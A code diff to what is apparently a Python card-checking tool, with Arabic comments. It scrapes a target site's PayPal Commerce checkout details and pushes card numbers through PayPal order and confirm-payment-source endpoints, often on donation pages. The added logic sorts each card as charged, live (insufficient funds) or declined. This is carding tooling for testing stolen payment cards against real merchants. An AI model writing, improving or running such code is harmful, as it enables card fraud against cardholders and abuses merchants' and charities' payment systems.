@@ -102,7 +102,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ------------------- PayPal Commerce Class - Final Universal -------------------
+# ------------------- PayPal Commerce Class - Final Smart -------------------
 
 class PayPalCommerce:
     def __init__(self, target_url=None):
@@ -116,6 +116,7 @@ class PayPalCommerce:
         self.client_id = None
         self.access_token = None
         self.client_token = None
+        self.merchant_id = None
         self.form_data = {}
         self.ajax_url = None
         self.payment_method = None
@@ -143,6 +144,7 @@ class PayPalCommerce:
             html = response.text
             
             self._extract_client_id(html)
+            self._extract_merchant_id(html)
             self._extract_form_data(html)
             self._detect_gateway_type(html)
             self._extract_ajax_url(html)
@@ -187,6 +189,19 @@ class PayPalCommerce:
                 if client_id_match:
                     self.client_id = client_id_match.group(1)
                     return
+
+    def _extract_merchant_id(self, html):
+        patterns = [
+            r'merchant-id="([^"]+)"',
+            r'merchant_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-merchant-id="([^"]+)"',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                self.merchant_id = match.group(1)
+                return
 
     def _extract_form_data(self, html):
         inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
@@ -410,7 +425,7 @@ class PayPalCommerce:
             auth_tokens.append(self.client_id)
         
         for auth_token in auth_tokens:
-            he4 = {
+            headers = {
                 'authorization': f'Bearer {auth_token}',
                 'paypal-client-metadata-id': self.client_id or '',
                 'user-agent': self.uu.random,
@@ -418,7 +433,7 @@ class PayPalCommerce:
                 'accept': 'application/json',
             }
             
-            da3 = {
+            data = {
                 'payment_source': {
                     'card': {
                         'number': card_number,
@@ -434,8 +449,8 @@ class PayPalCommerce:
             try:
                 response = self.r.post(
                     f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                    headers=he4,
-                    json=da3,
+                    headers=headers,
+                    json=data,
                     timeout=15
                 )
                 
@@ -444,15 +459,14 @@ class PayPalCommerce:
                         return response, response.json()
                     except:
                         return response, {}
-                
             except:
-                continue
+                pass
             
             try:
                 response = self.r.post(
                     f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                    headers=he4,
-                    json=da3,
+                    headers=headers,
+                    json=data,
                     timeout=15
                 )
                 
@@ -461,9 +475,8 @@ class PayPalCommerce:
                         return response, response.json()
                     except:
                         return response, {}
-                
             except:
-                continue
+                pass
         
         return None, {}
 
@@ -494,7 +507,6 @@ class PayPalCommerce:
             'give_paypal_commerce_approve_order',
             'give_approve_order',
             'approve_order',
-            'give_process_donation',
         ]
         
         for action in actions:
@@ -514,7 +526,7 @@ class PayPalCommerce:
         return None
 
     def Charge(self, ccx):
-        """فحص البطاقة - CHARGE حقيقي فقط"""
+        """فحص البطاقة - فلترة ذكية نهائية"""
         self.checked += 1
         ccx = ccx.strip()
         
@@ -533,34 +545,42 @@ class PayPalCommerce:
             
             expiry = f"20{yy}-{mm}"
             
-            # 1. Order
             order_id = self._create_order()
             if not order_id:
                 return "Create Order Failed"
             
-            # 2. Confirm
             confirm_res, confirm_json = self._confirm_payment(order_id, n, expiry, cvc)
             
-            # 3. Approve - الموقع يرجع الرد
             approve_res = self._approve_order(order_id)
             
             text = approve_res.text if approve_res else ''
             text_lower = text.lower()
+            text_upper = text.upper()
             
-            # ============ التصنيف النهائي ============
-            
-            # CHARGE حقيقي - الموقع قال true فقط
+            # CHARGE حقيقي - true فقط
             if text_lower.strip() == 'true':
                 return 'CHARGE 1.0'
             
             if '"success":true' in text_lower.replace(' ', ''):
                 return 'CHARGE 1.0'
             
-            # LIVE - INSUFFICIENT_FUNDS
-            if 'INSUFFICIENT_FUNDS' in text or 'INSUFFICIENT_FUNDS' in str(confirm_json):
+            # LIVE - INSUFFICIENT_FUNDS فقط بدون DECLINED
+            if 'INSUFFICIENT_FUNDS' in text_upper and 'DECLINED' not in text_upper:
                 return "INSUFFICIENT_FUNDS"
             
-            # أي خطأ - نرجع من الموقع
+            # DECLINED_PLEASE_RETRY = DECLINED
+            if 'DECLINED_PLEASE_RETRY' in text_upper:
+                return "DECLINED_PLEASE_RETRY"
+            
+            # أي DECLINED = DECLINED
+            if 'DECLINED' in text_upper:
+                return "DECLINED"
+            
+            # ORDER_NOT_APPROVED
+            if 'ORDER_NOT_APPROVED' in text_upper or 'ORDER_NOT_APPROVED' in str(confirm_json).upper():
+                return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
+            
+            # أي خطأ من الموقع
             if approve_res:
                 try:
                     error = approve_res.json()['data']['error']
@@ -583,6 +603,7 @@ class PayPalCommerce:
 # ------------------- Core API Engine -------------------
 
 async def check_card_api(card_full, gateway_url):
+    """فحص البطاقة - فلترة ذكية"""
     async with api_semaphore:
         try:
             loop = asyncio.get_event_loop()
@@ -593,11 +614,17 @@ async def check_card_api(card_full, gateway_url):
 
             result_raw = await loop.run_in_executor(None, run_check)
             result = str(result_raw).lower()
+            result_upper = str(result_raw).upper()
 
-            if "charge" in result:
+            # CHARGE حقيقي
+            if "charge" in result and "declined" not in result and "retry" not in result:
                 return "approved", result_raw
-            elif "insufficient" in result:
+            
+            # LIVE - INSUFFICIENT_FUNDS فقط
+            elif "insufficient_funds" in result and "declined" not in result:
                 return "live", result_raw
+            
+            # أي حاجة تانية = DECLINED
             else:
                 return "declined", result_raw if result_raw else "Declined"
         except Exception as e:
